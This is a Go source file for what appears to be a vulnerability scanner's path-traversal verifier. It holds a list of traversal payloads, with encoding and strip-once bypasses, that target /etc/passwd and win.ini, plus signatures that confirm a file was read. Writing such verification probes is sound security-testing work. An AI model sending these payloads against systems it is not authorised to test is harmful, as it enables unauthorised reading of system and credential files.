package verify

import (
	"net/http"
	"regexp"
	"strings"
)

// passwdSignature matches a /etc/passwd line (root:x:0:0:...) — proof the app
// read an arbitrary file off the filesystem. The regex (not a substring) avoids
// confirming on pages that merely contain the word "root".
var passwdSignature = regexp.MustCompile(`(?m)^root:[^:]*:0:0:`)

// winIniSignatures appear in C:\Windows\win.ini — the Windows path-traversal oracle.
var winIniSignatures = []string{"[fonts]", "[extensions]", "for 16-bit app support"}

// pathTraversalPayloads walk up to the filesystem root and request a well-known
// file, with the common encoding/normalisation bypasses layered in.
func pathTraversalPayloads() []string {
	return []string{
		"../../../../../../../../etc/passwd",
		"....//....//....//....//....//etc/passwd",         // strip-once bypass
		"..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",       // URL-encoded slash
		"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // fully encoded
		"../../../../../../../../windows/win.ini",          // Windows
		"..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",       // Windows, encoded backslash
	}
}

// PathTraversalProbe verifies directory traversal / local file read: feed the
// suspect param a path that climbs to the filesystem root and asks for a
// well-known file, then check whether its contents come back. The oracle is a
// content signature of the target file, so a generic 404/echo does not confirm.
type PathTraversalProbe struct{}

func (PathTraversalProbe) Kind() string { return "path-traversal" }

func (p PathTraversalProbe) Plan(f Finding, _ string) Plan {
	u, _ := buildURL(f, f.Param, pathTraversalPayloads()[0])
	return Plan{Summary: methodOf(f) + " " + u +
		"   [" + f.Param + " = traversal to /etc/passwd or win.ini (+ encoding bypasses)]"}
}

func (p PathTraversalProbe) Execute(f Finding, env *Env) Result {
	r := Result{}
	var lastErr string
	for _, payload := range pathTraversalPayloads() {
		u, err := buildURL(f, f.Param, payload)
		if err != nil {
			continue
		}
		req, err := http.NewRequest(methodOf(f), u, nil)
		if err != nil {
			continue
		}
		applyHeaders(req, f)
		_, body, err := env.do(req)
		if err != nil {
			lastErr = err.Error()
			continue
		}
		if passwdSignature.MatchString(body) {
			r.Confirmed = true
			r.Evidence = "file read: response contains an /etc/passwd line (root:…:0:0:) via " + payload
			return r
		}
		low := strings.ToLower(body)
		for _, sig := range winIniSignatures {
			if strings.Contains(low, sig) {
				r.Confirmed = true
				r.Evidence = "file read: response contains win.ini marker " + sig + " via " + payload
				return r
			}
		}
	}
	r.Refuted = true
	r.Evidence = "no payload returned a known system-file signature"
	if lastErr != "" {
		r.Evidence += " (last request error: " + lastErr + ")"
	}
	return r
}

func init() { Register(PathTraversalProbe{}) }
